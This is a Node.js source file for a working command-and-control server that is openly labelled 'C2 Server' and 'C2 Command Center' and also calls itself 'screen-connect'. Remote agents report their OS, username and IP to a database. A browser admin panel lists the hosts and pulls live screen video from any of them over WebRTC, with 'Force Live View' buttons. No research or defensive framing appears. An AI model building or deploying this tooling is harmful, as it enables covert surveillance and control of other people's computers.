const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const { v4: uuidv4 } = require('uuid');
const path = require('path');
const { createClient } = require('@libsql/client');
const fs = require('fs');
const os = require('os');

// =====================================================
// TURSO DATABASE SETUP
// =====================================================

const RAW_URL = process.env.TURSO_DATABASE_URL || '';
const RAW_TOKEN = process.env.TURSO_AUTH_TOKEN || '';

const TURSO_DB_URL = RAW_URL.trim();
const TURSO_AUTH_TOKEN = RAW_TOKEN
 .replace(/\r?\n/g, '')
 .replace(/\s+/g, ' ')
 .trim()
 .replace(/^Bearer\s+/i, '')
 .trim();

if (!TURSO_DB_URL) {
 console.error('[DB] Missing TURSO_DATABASE_URL environment variable.');
 process.exit(1);
}

if (!TURSO_AUTH_TOKEN) {
 console.error('[DB] Missing TURSO_AUTH_TOKEN environment variable.');
 process.exit(1);
}

console.log('[DB] Connecting to Turso at ' + TURSO_DB_URL.replace(/\/\/.*@/, '//***@'));

let dbClient;
let dbReady = false;

try {
 dbClient = createClient({
 url: TURSO_DB_URL,
 authToken: TURSO_AUTH_TOKEN,
 });
} catch (error) {
 console.error('[DB] Turso client creation failed:', error.message);
 process.exit(1);
}

async function ensureSchema() {
 try {
 await dbClient.execute(`
 CREATE TABLE IF NOT EXISTS users (
 id TEXT PRIMARY KEY,
 os TEXT,
 arch TEXT,
 user TEXT,
 ip TEXT,
 last_seen INTEGER,
 status TEXT DEFAULT 'Offline',
 created_at INTEGER DEFAULT (strftime('%s', 'now'))
 );
 `);

 await dbClient.execute(`
 CREATE TABLE IF NOT EXISTS logs (
 id INTEGER PRIMARY KEY AUTOINCREMENT,
 message TEXT,
 timestamp INTEGER DEFAULT (strftime('%s', 'now'))
 );
 `);

 await dbClient.execute('SELECT 1');
 console.log('[DB] Schema verified / created successfully.');
 dbReady = true;
 } catch (error) {
 console.error('[DB] Schema creation failed:', error.message);
 throw error;
 }
}

function query(sql, params = []) {
 return dbClient.execute(sql, params);
}

async function queryOne(sql, params = []) {
 const result = await dbClient.execute({ sql, args: params });
 return result.rows[0] ?? null;
}

async function queryRows(sql, params = []) {
 const result = await dbClient.execute({ sql, args: params });
 return result.rows;
}

// =====================================================
// LOGGING
// =====================================================

function logDB(msg) {
 const timestamp = Date.now();
 console.log(`[${new Date(timestamp).toISOString()}] ${msg}`);

 if (dbReady) {
 dbClient.execute(
 'INSERT INTO logs (message, timestamp) VALUES (?, ?)',
 [String(msg), Math.floor(timestamp / 1000)]
 ).catch((err) => {
 console.error('[DB LOG ERROR]', err.message);
 });
 }
}

logDB('Initializing Database...');

// =====================================================
// EXPRESS AND HTTP SERVER
// =====================================================

const app = express();
const server = http.createServer(app);

const wss = new WebSocket.Server({
 server,
 perMessageDeflate: false,
});

app.disable('x-powered-by');

app.get('/health', async (req, res) => {
 try {
 await dbClient.execute('SELECT 1 AS health_check');
 res.json({
 status: 'ok',
 service: 'screen-connect',
 database: 'connected',
 uptime: process.uptime(),
 db_type: 'turso/libsql',
 db_ready: dbReady,
 });
 } catch (error) {
 res.status(503).json({
 status: 'degraded',
 service: 'screen-connect',
 database: 'disconnected',
 uptime: process.uptime(),
 db_type: 'turso/libsql',
 error: error.message,
 db_ready: dbReady,
 });
 }
});

app.use((req, res, next) => {
 let requestPath;
 try {
 requestPath = decodeURIComponent(req.path);
 } catch {
 return res.sendStatus(400);
 }
 if (/(^|\/)c2\.db(?:-(?:wal|shm))?$/i.test(requestPath)) {
 return res.sendStatus(404);
 }
 next();
});

app.get('/', (req, res) => {
 res.send(adminHTML);
});

app.get('/admin.html', (req, res) => {
 res.setHeader('Content-Type', 'text/html');
 res.send(adminHTML);
});

// =====================================================
// WEBSOCKET HELPERS
// =====================================================

function sendMessage(ws, data) {
 if (ws && ws.readyState === WebSocket.OPEN) {
 ws.send(JSON.stringify(data));
 return true;
 }
 return false;
}

function notifyAdmin(adminId, message) {
 for (const client of wss.clients) {
 if (client.isAdmin && client.adminId === adminId && client.readyState === WebSocket.OPEN) {
 sendMessage(client, { type: 'notification', message });
 }
 }
}

function broadcastToAdmins(sender, msg) {
 for (const client of wss.clients) {
 if (client.isAdmin && client.readyState === WebSocket.OPEN) {
 sendMessage(client, msg);
 }
 }
}

function findAgentByUniqueID(uniqueId) {
 for (const client of wss.clients) {
 if (!client.isAdmin && client.uniqueId === uniqueId && client.readyState === WebSocket.OPEN) {
 return client;
 }
 }
 return null;
}

function isAgentConnected(uniqueId, excludedClient = null) {
 for (const client of wss.clients) {
 if (client !== excludedClient && !client.isAdmin && client.uniqueId === uniqueId && client.readyState === WebSocket.OPEN) {
 return true;
 }
 }
 return false;
}

// =====================================================
// WEBSOCKET CONNECTION HANDLING
// =====================================================

wss.on('connection', (ws, req) => {
 const clientId = uuidv4().substring(0, 8);
 ws.id = clientId;
 ws.isAdmin = false;
 ws.adminId = null;
 ws.uniqueId = null;
 ws.isAlive = true;
 const remoteAddress = req.socket.remoteAddress || 'Unknown';

 logDB(`[+] WebSocket Connected: ${clientId}`);

 ws.on('message', async (msgRaw) => {
 try {
 const data = JSON.parse(msgRaw.toString());
 if (!data || typeof data !== 'object') return;

 // ADMIN REGISTRATION
 if (data.type === 'register_admin') {
 ws.isAdmin = true;
 ws.adminId = clientId;
 logDB(`[ADMIN] Connected via port ${req.socket.remotePort}`);
 notifyAdmin(clientId, '🛡️ Admin Session Started');
 sendMessage(ws, { type: 'registered', id: clientId });
 broadcastToAdmins(ws, { type: 'refresh_users' });
 return;
 }

 // AGENT INFO — THE CRITICAL FIX
 if (data.type === 'info') {
 if (ws.isAdmin) return;

 // Accept BOTH 'id' and 'uniqueId' as the persistent identifier
 const uniqueId = String(data.uniqueId || data.id || '').trim();
 if (!uniqueId || uniqueId.length > 255) {
 logDB('[WARN] Invalid agent unique ID');
 return;
 }

 ws.uniqueId = uniqueId;
 const now = Date.now();

 // Check if this agent already exists in DB
 const existingUser = await queryOne('SELECT * FROM users WHERE id = ?', [uniqueId]);

 if (!existingUser) {
 // NEW AGENT — insert
 await dbClient.execute(`
 INSERT INTO users (id, os, arch, user, ip, last_seen, status)
 VALUES (?, ?, ?, ?, ?, ?, 'Online')
 `, [uniqueId, data.os || null, data.arch || null, data.user || null, data.ip || remoteAddress, now]);
 logDB(`[AGENT] NEW: ${uniqueId} (${data.os || 'unknown'})`);
 } else {
 // EXISTING AGENT — update
 await dbClient.execute(`
 UPDATE users SET
 last_seen = ?,
 status = 'Online',
 os = COALESCE(?, os),
 arch = COALESCE(?, arch),
 user = COALESCE(?, user),
 ip = COALESCE(?, ip)
 WHERE id = ?
 `, [now, data.os || null, data.arch || null, data.user || null, data.ip || remoteAddress, uniqueId]);
 logDB(`[AGENT] REJOIN: ${uniqueId} (${data.os || 'unknown'})`);
 }

 // Notify all admins
 for (const client of wss.clients) {
 if (client.readyState === WebSocket.OPEN && client.isAdmin) {
 sendMessage(client, {
 type: 'user_update',
 id: uniqueId,
 info: data,
 lastSeen: now,
 });
 }
 }
 return;
 }

 // WEBRTC SIGNALING
 if (['offer', 'answer', 'candidate'].includes(data.type)) {
 if (ws.isAdmin && data.targetId) {
 const targetWs = findAgentByUniqueID(String(data.targetId));
 if (targetWs && targetWs.readyState === WebSocket.OPEN) {
 sendMessage(targetWs, data);
 } else {
 logDB(`[WARN] Agent not connected: ${data.targetId}`);
 }
 return;
 }

 if (!ws.isAdmin && data.targetId === 'admin') {
 for (const client of wss.clients) {
 if (client.readyState === WebSocket.OPEN && client.isAdmin) {
 sendMessage(client, data);
 }
 }
 return;
 }
 }

 } catch (error) {
 logDB(`[ERR] Message processing error: ${error.message}`);
 }
 });

 ws.on('pong', () => { ws.isAlive = true; });

 ws.on('close', async () => {
 logDB(`[-] Client Disconnected: ${ws.id}`);

 if (!ws.isAdmin && ws.uniqueId) {
 const uniqueId = ws.uniqueId;
 if (!isAgentConnected(uniqueId, ws)) {
 try {
 await dbClient.execute(`
 UPDATE users SET status = 'Offline', last_seen = ? WHERE id = ?
 `, [Date.now(), uniqueId]);
 logDB(`[AGENT] Offline: ${uniqueId}`);
 } catch (error) {
 logDB(`[DB ERR] Disconnect update: ${error.message}`);
 }
 }
 }

 broadcastToAdmins(ws, { type: 'refresh_users' });
 });

 ws.on('error', (error) => {
 logDB(`[WS ERR] ${ws.id}: ${error.message}`);
 });
});

// =====================================================
// WEBSOCKET HEARTBEAT
// =====================================================

const heartbeat = setInterval(() => {
 for (const ws of wss.clients) {
 if (ws.isAlive === false) { ws.terminate(); continue; }
 ws.isAlive = false;
 if (ws.readyState === WebSocket.OPEN) { ws.ping(); }
 }
}, 30000);

wss.on('close', () => { clearInterval(heartbeat); });

// =====================================================
// SERVER STARTUP — CRITICAL FIX
// =====================================================

const PORT = process.env.PORT || 10000;

async function startServer() {
 try {
 await ensureSchema();
 console.log('[DB] Database initialized successfully.');

 server.listen(PORT, '0.0.0.0', () => {
 const address = server.address();
 console.log(`[SERVER] C2 Server running on port ${PORT}`);
 console.log(`[SERVER] Address: ${address.address}:${address.port}`);
 console.log(`[SERVER] Database: Turso (LibSQL) - ${TURSO_DB_URL.replace(/\/\/.*@/, '//***@')}`);
 logDB(`C2 Server running on port ${PORT}`);
 logDB(`Database: Turso (LibSQL) - ${TURSO_DB_URL.replace(/\/\/.*@/, '//***@')}`);
 });
 } catch (error) {
 console.error('[STARTUP ERROR]', error.message);
 process.exit(1);
 }
}

startServer();

server.on('error', (error) => {
 logDB(`[SERVER ERROR] ${error.message}`);
});

let isShuttingDown = false;

function shutdown(signal) {
 if (isShuttingDown) return;
 isShuttingDown = true;
 console.log(`[SERVER] ${signal} received. Shutting down...`);
 clearInterval(heartbeat);

 for (const client of wss.clients) {
 try { client.terminate(); } catch (error) {
 console.error('[SERVER] WebSocket shutdown error:', error.message);
 }
 }

 wss.close(() => {
 server.close(() => {
 if (dbClient) {
 try { dbClient.disconnect?.(); console.log('[DB] Turso client closed.'); }
 catch (error) { console.error('[DB] Error closing Turso client:', error.message); }
 }
 process.exit(0);
 });
 });

 setTimeout(() => process.exit(1), 10000).unref();
}

process.on('SIGTERM', () => shutdown('SIGTERM'));
process.on('SIGINT', () => shutdown('SIGINT'));

// =====================================================
// ADMIN PANEL HTML
// =====================================================

const adminHTML = `
<!DOCTYPE html>
<html lang="en">
<head>
 <meta charset="UTF-8">
 <title>C2 Command Center</title>
 <style>
 body { background: #0f172a; color: #fff; font-family: 'Segoe UI', sans-serif; padding: 20px; margin: 0; }
 h1 { margin-top: 0; font-size: 24px; border-bottom: 1px solid #334155; padding-bottom: 10px; }
 .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 20px; margin-bottom: 20px; }
 .card { background: #1e293b; padding: 15px; border-radius: 8px; border: 1px solid #334155; transition: transform 0.2s; position: relative; }
 .card:hover { transform: translateY(-2px); border-color: #3b82f6; }
 .btn { background: #3b82f6; color: white; border: none; padding: 10px; width: 100%; cursor: pointer; margin-top: 10px; border-radius: 4px; font-weight: bold; }
 .btn:hover { background: #2563eb; }
 .btn.active { background: #10b981; }
 .btn-force { background: #f59e0b; margin-top: 5px; }
 .btn-force:hover { background: #d97706; }
 .btn-danger { background: #ef4444; margin-top: 5px; }
 .btn-danger:hover { background: #dc2626; }

 #videoModal {
 display: none;
 position: fixed;
 top: 0; left: 0; width: 100%; height: 100%;
 background: rgba(0,0,0,0.95);
 z-index: 1000;
 justify-content: center;
 align-items: center;
 flex-direction: column;
 }
 #videoModal video {
 width: 80%;
 max-height: 80%;
 background: #000;
 border: 2px solid #3b82f6;
 }
 #closeVideo {
 position: absolute;
 top: 20px;
 right: 20px;
 background: red;
 color: white;
 border: none;
 padding: 10px 20px;
 cursor: pointer;
 font-size: 16px;
 z-index: 1001;
 }

 #logs-container { height: 300px; overflow-y: auto; background: #000; padding: 10px; font-size: 12px; color: #ccc; border: 1px solid #334155; border-radius: 8px; }
 .log-entry { margin-bottom: 4px; border-bottom: 1px solid #1e293b; padding-bottom: 2px; }
 .log-time { color: #64748b; margin-right: 8px; }
 .log-alert-green { color: #4ade80; }
 .log-alert-red { color: #f87171; }
 .log-alert-blue { color: #60a5fa; }
 .log-alert-white { color: #e2e80; }

 .status-dot { height: 10px; width: 10px; border-radius: 50%; display: inline-block; margin-right: 5px; }
 .status-online { background-color: #4ade80; }
 .status-offline { background-color: #94a3b8; }
 .status-connecting { background-color: #fbbf24; }

 .empty-state { text-align: center; color: #64748b; margin-top: 50px; font-style: italic; }
 </style>
</head>
<body>
 <h1>🛡️ C2 Command Center</h1>

 <!-- User Grid -->
 <div class="grid" id="userGrid"></div>
 <div id="emptyState" class="empty-state">Waiting for connections...</div>

 <!-- Live Logs -->
 <h3>Live Event Log</h3>
 <div id="logs-container"></div>

 <!-- Video Modal -->
 <div id="videoModal">
 <button id="closeVideo" onclick="closeVideo()">Close</button>
 <video id="remoteVideo" autoplay playsinline></video>
 <button class="btn btn-force" style="position: absolute; bottom: 20px; left: 50%; transform: translateX(-50%); width: 200px;" onclick="forceLiveViewFromFrame()">🔄 Force Live Stream</button>
 </div>

 <script>
 const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
 const host = window.location.host;
 const wsUrl = \`\${protocol}//\${host}/\`;

 const ws = new WebSocket(wsUrl);
 let users = {};

 let sessions = {};
 const remoteVideo = document.getElementById('remoteVideo');

 ws.onopen = () => {
 console.log("Admin connected to C2");
 ws.send(JSON.stringify({ type: 'register_admin' }));
 addLog("Connected to C2 Server", "blue");
 };

 ws.onmessage = (event) => {
 try {
 const data = JSON.parse(event.data);

 if (data.type === 'registered') {
 ws.isAdmin = true;
 addLog("Admin Session Registered", "blue");
 }
 else if (data.type === 'alert') {
 addLog(data.message, data.message.includes('🟢') ? 'green' : 'red');
 }
 else if (data.type === 'user_update') {
 const userId = data.id;
 addLog(\`🟢 User: \${userId} — \${data.info.os || 'Unknown'} / \${data.info.user || 'Unknown'}\`, 'green');

 if (!users[userId]) {
 users[userId] = { status: 'Online', logs: [], info: data.info, lastSeen: data.lastSeen, sessionActive: false };
 } else {
 users[userId].status = 'Online';
 users[userId].info = data.info;
 users[userId].lastSeen = data.lastSeen;
 users[userId].sessionActive = false;
 }
 renderUsers();
 }
 else if (data.type === 'refresh_users') {
 // handled by real-time updates
 }
 else if (data.type === 'heartbeat') {
 if (users[data.id]) {
 users[data.id].lastSeen = Date.now();
 users[data.id].status = 'Online';
 renderUsers();
 }
 }
 else if (data.type === 'system') {
 addLog(data.message, "blue");
 }
 else if (data.type === 'screen_data') {
 addLog(\`📺 Screen update from \${data.id}\`, 'blue');
 if (!users[data.id]) {
 users[data.id] = { status: 'Online', logs: [], info: {}, lastSeen: Date.now(), sessionActive: false };
 }
 users[data.id].lastSeen = Date.now();
 renderUsers();
 }
 else if (data.type === 'system_log') {
 addLog(data.message, 'white');
 }
 else if (data.type === 'offer') {
 addLog(\`[SIG] Received Offer from \${data.targetId}\`, 'green');
 handleWebRTCOffer(data.sdp, data.targetId);
 }
 else if (data.type === 'candidate') {
 addLog(\`[SIG] Received Candidate from \${data.targetId}\`, 'blue');
 handleWebRTCCandidate(data.candidate, data.targetId);
 }
 else if (data.type === 'session_active') {
 if (users[data.agentId]) {
 users[data.agentId].sessionActive = true;
 users[data.agentId].status = 'Online';
 renderUsers();
 addLog(\`[SESSION] Active session with \${data.agentId}\`, 'green');
 }
 }
 else {
 if (data.type !== 'registered' && data.type !== 'alert' && data.type !== 'user_update' && data.type !== 'screen_data' && data.type !== 'heartbeat' && data.type !== 'system' && data.type !== 'system_log') {
 addLog(\`[\${data.targetId || data.id}] Received: \${data.type}\`, 'blue');
 const userId = data.targetId || data.id;
 if (!users[userId]) {
 users[userId] = { status: 'Online', logs: [], info: {}, lastSeen: Date.now(), sessionActive: false };
 }
 users[userId].logs.push(data.type);
 users[userId].lastSeen = Date.now();
 renderUsers();
 }
 }
 } catch (e) {
 console.error("Error parsing message:", e);
 }
 };

 function getSession(targetId) {
 if (!sessions[targetId]) {
 sessions[targetId] = {
 pc: new RTCPeerConnection({
 iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
 }),
 candidates: []
 };

 const pc = sessions[targetId].pc;

 pc.ontrack = (event) => {
 remoteVideo.srcObject = event.streams[0];
 addLog(\`[VIDEO] Stream received from \${targetId}\`, 'green');
 document.getElementById('videoModal').style.display = 'flex';
 };

 pc.onicecandidate = (event) => {
 if (event.candidate) {
 ws.send(JSON.stringify({
 type: 'candidate',
 targetId: targetId,
 candidate: event.candidate
 }));
 }
 };

 pc.oniceconnectionstatechange = () => {
 const state = pc.iceConnectionState;
 addLog(\`[ICE] State: \${state} for \${targetId}\`, state === 'connected' ? 'green' : (state === 'failed' ? 'red' : 'blue'));
 if (state === 'disconnected' || state === 'failed') {
 closeSession(targetId);
 }
 };

 pc.onicegatheringstatechange = () => {
 addLog(\`[ICE] Gathering: \${pc.iceGatheringState} for \${targetId}\`, 'blue');
 };
 }
 return sessions[targetId];
 }

 async function handleWebRTCOffer(offerSDP, targetId) {
 const session = getSession(targetId);
 const pc = session.pc;

 try {
 await pc.setRemoteDescription(new RTCSessionDescription(offerSDP));

 while (session.candidates.length > 0) {
 const candidate = session.candidates.shift();
 await pc.addIceCandidate(new RTCIceCandidate(candidate));
 }

 const answer = await pc.createAnswer();
 await pc.setLocalDescription(answer);

 ws.send(JSON.stringify({
 type: 'answer',
 targetId: targetId,
 sdp: pc.localDescription
 }));

 addLog(\`[SIG] Answer sent to \${targetId}\`, 'green');
 } catch (err) {
 addLog(\`[WEBRTC] Error handling offer: \${err.message}\`, 'red');
 }
 }

 function handleWebRTCCandidate(candidate, targetId) {
 const session = getSession(targetId);

 if (session.pc.remoteDescription) {
 session.pc.addIceCandidate(new RTCIceCandidate(candidate))
 .catch(err => addLog(\`[WEBRTC] Error adding candidate: \${err.message}\`, 'red'));
 } else {
 session.candidates.push(candidate);
 }
 }

 function closeSession(targetId) {
 if (sessions[targetId]) {
 if (sessions[targetId].pc) {
 sessions[targetId].pc.close();
 }
 delete sessions[targetId];
 addLog(\`[CLOSE] Session closed for \${targetId}\`, 'red');
 }
 }

 function addLog(msg, colorClass = '') {
 const logContainer = document.getElementById('logs-container');
 const div = document.createElement('div');
 div.className = \`log-entry log-alert-\${colorClass}\`;
 const timeSpan = document.createElement('span');
 timeSpan.className = 'log-time';
 timeSpan.innerText = new Date().toLocaleTimeString();
 const msgSpan = document.createElement('span');
 msgSpan.innerText = msg;
 div.appendChild(timeSpan);
 div.appendChild(msgSpan);
 logContainer.prepend(div);
 if (logContainer.children.length > 100) {
 logContainer.removeChild(logContainer.lastChild);
 }
 }

 function renderUsers() {
 const grid = document.getElementById('userGrid');
 const emptyState = document.getElementById('emptyState');
 grid.innerHTML = '';
 const userCount = Object.keys(users).length;

 if (userCount === 0) {
 emptyState.style.display = 'block';
 return;
 } else {
 emptyState.style.display = 'none';
 }

 for (const [id, data] of Object.entries(users)) {
 const card = document.createElement('div');
 card.className = 'card';

 const osInfo = data.info ? \`\${data.info.os || 'Unknown'} / \${data.info.user || 'Unknown'}\` : 'Unknown OS';
 const lastSeen = data.lastSeen ? new Date(data.lastSeen).toLocaleTimeString() : 'N/A';

 let statusColor = 'status-offline';
 let btnText = 'Join Session';
 let btnClass = '';

 if (data.status === 'Online') {
 statusColor = 'status-online';
 if (data.sessionActive) {
 btnText = 'Reconnect Session';
 btnClass = 'active';
 }
 } else if (data.status === 'Connecting...') {
 statusColor = 'status-connecting';
 btnText = 'Connecting...';
 }

 card.innerHTML = \`
 <strong>User ID: \${id}</strong><br>
 <span class="status-dot \${statusColor}"></span> Info: \${osInfo}<br>
 Last Seen: \${lastSeen}<br>
 <button class="btn \${btnClass}" onclick="joinUser('\${id}', '\${data.status}')">\${btnText}</button>
 <button class="btn btn-force" onclick="forceLiveView('\${id}')">📺 Force Live View</button>
 \`;
 grid.appendChild(card);
 }
 }

 function joinUser(id, status) {
 if (users[id] && users[id].signalingData) {
 const sigData = users[id].signalingData;
 ws.send(JSON.stringify({
 type: sigData.type,
 targetId: id,
 sdp: sigData.sdp,
 candidate: sigData.candidate
 }));
 addLog(\`[ADMIN] Resent \${sigData.type} to \${id}\`, 'green');
 } else {
 ws.send(JSON.stringify({
 type: 'request_join',
 targetId: id,
 from: null
 }));
 addLog(\`[ADMIN] Requested new join to \${id}\`, 'blue');
 }

 const card = document.querySelector(\`button[onclick="joinUser('\${id}', '\${status}')"]\`).parentElement;
 card.style.borderColor = '#4ade80';
 setTimeout(() => card.style.borderColor = '#3b82f6', 500);
 }

 function forceLiveView(id) {
 addLog(\`[FORCE] Forcing live view for \${id}\`, 'yellow');
 if (sessions[id]) {
 closeSession(id);
 }
 ws.send(JSON.stringify({
 type: 'request_join',
 targetId: id,
 from: null
 }));
 }

 function forceLiveViewFromFrame() {
 const ids = Object.keys(sessions);
 if(ids.length > 0) {
 const lastId = ids[ids.length - 1];
 closeSession(lastId);
 ws.send(JSON.stringify({
 type: 'request_join',
 targetId: lastId,
 from: null
 }));
 }
 }

 function closeVideo() {
 document.getElementById('videoModal').style.display = 'none';
 Object.keys(sessions).forEach(sid => closeSession(sid));
 remoteVideo.srcObject = null;
 }
 </script>
</body>
</html>
`;
